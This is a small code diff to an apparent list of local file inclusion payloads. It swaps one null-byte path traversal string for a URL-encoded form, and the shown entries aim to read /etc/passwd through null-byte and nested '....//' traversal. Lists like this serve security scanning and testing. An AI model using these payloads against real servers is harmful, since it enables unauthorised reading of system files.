@@ -18,7 +18,7 @@ LFI_PAYLOADS = [
     # Null byte injection
     '../../../../etc/passwd%00',
     '../../../etc/passwd%00.txt',
-    '../../../../etc/passwd\\x00',
+    '../../../../etc/passwd%00',
 
     # Nested traversal
     '....//....//....//etc/passwd',
